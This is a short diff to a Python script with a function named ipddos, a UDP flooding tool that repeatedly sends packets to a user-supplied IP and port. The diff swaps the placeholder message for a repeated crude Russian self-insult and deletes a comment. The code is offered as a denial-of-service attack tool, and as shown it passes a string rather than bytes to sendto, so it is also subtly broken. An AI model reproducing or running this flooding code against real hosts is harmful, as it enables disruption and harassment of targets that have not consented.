@@ -117,7 +117,7 @@ def ipddos():
 
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 while not stop_sending:
-                    message = "Ваше сообщение"
+                    message = "Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый "
                     s.sendto(message, (ipadd, port))
                     time.sleep(0.1) 
 
@@ -128,8 +128,6 @@ def ipddos():
             print(Fore.RED + f" Произошла ошибка запроса: {e}")
         except Exception as e:
             print(Fore.RED + f" Произошла ошибка: {e}")
-
-    # Остановка отправки сообщений
     if stop_sending:
         print(Fore.YELLOW + " Отправка сообщений остановлена.");
 
